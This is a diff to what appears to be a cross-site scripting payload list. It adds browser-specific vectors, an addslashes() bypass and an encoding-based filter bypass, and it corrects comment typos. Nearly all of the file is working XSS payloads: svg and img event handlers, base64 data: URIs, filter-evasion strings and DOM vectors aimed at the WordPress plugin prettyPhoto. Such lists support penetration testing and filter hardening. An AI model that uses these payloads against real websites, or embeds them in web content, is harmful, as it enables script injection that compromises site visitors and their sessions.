@@ -1,5 +1,12 @@
+
+
+
 data:text/html;base64,PHNjcmlwdD5jb25maXJtKGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4= //confirm(document.domain)
+
+
 "><svg onload=confirm(domain)>
+
+
 "><script>confirm(document.domain)</script>
 
 
@@ -9,7 +16,7 @@ data:text/html;base64,PHNjcmlwdD5jb25maXJtKGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4= /
 1"--></script><svg/onload=';confirm(domain);'>
 
 
-<svg </onload ="1> (_=alert,_(1337)) ""> // Hard test for XSS filters.
+<svg </onload ="1> (_=alert,_(1337)) ""> // Hard test for XSS filters
 
 <svg><x><script>alert&#40;1&#41</x>
 <svg><x><script>alert&#40;&#39;1&#39;&#41</x>
@@ -54,7 +61,7 @@ autofocus onfocus=window.onerror=alert;throw/1/;//
 <p/onmouseover='alert(1)'>xwx
 <plaintext/onmouseover=prompt(1)>          
 		                                               
-/*Classic very popular vector*/
+/*Classic very popular vectors*/
 					 
 <script>alert(1)</script>
 </script><img src=x onerror=alert(1);>
@@ -83,13 +90,21 @@ autofocus onfocus=window.onerror=alert;throw/1/;//
 <textarea autofocus onfocus=alert(1)>
 <keygen autofocus onfocus=alert(1)>
 <form><button formaction="javascript:alert(1)">		 
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)"> // Firefox only
+<details ontoggle=alert(1)> //Chrome only
 					 
 					 
+
+
 /*data:text*/
+
 data:text/plain,alert('xwx')
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 
-/*Bonus Dom Based Xss wector for popular WordPress plugin Prettyphoto*/
+
+
+
+/*Bonus Dom Based Xss vector for popular WordPress plugin Prettyphoto*/
 					 
 #!prettyPhoto/2,<a onclick="alert(1);">/		                /*firefox*/			 
 #prettyPhoto[gallery]/1,<a onclick="alert(1);">/                  /*firefox*/
@@ -97,3 +112,15 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 #prettyphoto[pp_gal]/2,<img src=1 onerror=alert(1)>	       /*Only Google chrome*/
 #prettyPhoto[i]/x,<svg/onload=alert(0)>/x                        /*firefox*/	
 #prettyphoto[xss]/x,<img src=x onerror=prompt(0)>/x      /*firefox*/	
+
+
+
+
+
+/*Bypass addslashes()*/
+
+"' onmouseover=alert(1) a= '"
+
+
+/*Bypass filters using US-Encoding (IE 6 & 7 only)*/
+¼script¾alert(¢xss¢)¼/script¾
